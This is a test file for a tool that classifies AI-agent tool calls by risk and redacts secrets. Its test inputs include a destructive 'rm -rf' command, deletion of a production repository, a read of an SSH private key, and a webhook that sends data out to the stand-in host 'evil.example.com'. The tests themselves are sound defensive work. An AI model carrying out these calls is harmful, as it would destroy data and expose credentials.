import { describe, expect, it } from 'vitest';
import { classifyCall, redactDeep } from '../src/classify.js';

describe('classifyCall', () => {
  it('flags shell execution as critical', () => {
    const r = classifyCall('server', 'run_command', { command: 'rm -rf /tmp/x' });
    expect(r.severity).toBe('critical');
    expect(r.tags).toContain('shell');
    expect(r.summary).toMatch(/run:/);
  });

  it('flags delete tools as critical', () => {
    const r = classifyCall('github', 'delete_repository', { owner: 'acme', repo: 'prod' });
    expect(r.severity).toBe('critical');
    expect(r.tags).toContain('delete');
  });

  it('flags sensitive paths as high', () => {
    const r = classifyCall('fs', 'read_file', { path: '/home/dev/.ssh/id_rsa' });
    expect(['high', 'critical']).toContain(r.severity);
    expect(r.tags).toContain('sensitive-path');
    expect(r.path).toBe('/home/dev/.ssh/id_rsa');
  });

  it('flags external URLs as at least high', () => {
    const r = classifyCall('notes', 'send_note', {
      webhook: 'https://evil.example.com/collect',
      note: 'hello',
    });
    expect(r.severity).toBe('high');
    expect(r.domain).toBe('evil.example.com');
    expect(r.tags).toContain('network');
  });

  it('treats plain reads as low', () => {
    const r = classifyCall('notes', 'read_note', { id: 'meeting' });
    expect(r.severity).toBe('low');
    expect(r.tags).toContain('read');
  });

  it('escalates flagged descriptions', () => {
    const r = classifyCall('notes', 'read_note', { id: 'x' }, { flagged: true });
    expect(r.severity).toBe('high');
    expect(r.tags).toContain('flagged-description');
  });

  it('escalates on baseline anomalies', () => {
    const r = classifyCall('fs', 'read_file', { path: '/tmp/a.txt' }, {
      anomalies: ['new path root: /tmp'],
    });
    expect(r.severity).toBe('medium');
    expect(r.tags).toContain('anomaly');
  });
});

describe('redactDeep', () => {
  it('redacts API keys in strings', () => {
    const out = redactDeep({ header: 'Authorization: Bearer abc123secrettokenvalue' });
    expect(out.header).toContain('[REDACTED]');
  });

  it('redacts known secret-shaped values', () => {
    expect(redactDeep('sk-abcdefghijklmnop')).toBe('[REDACTED]');
    expect(redactDeep('key=ghp_' + 'a'.repeat(30))).toContain('[REDACTED]');
  });

  it('redacts sensitive field names', () => {
    const out = redactDeep({ password: 'hunter2', keep: 'visible' });
    expect(out.password).toBe('[REDACTED]');
    expect(out.keep).toBe('visible');
  });

  it('walks nested structures', () => {
    const out = redactDeep({ a: { b: [{ token: 'x', n: 1 }] } });
    expect(out.a.b[0]!.token).toBe('[REDACTED]');
    expect(out.a.b[0]!.n).toBe(1);
  });
});
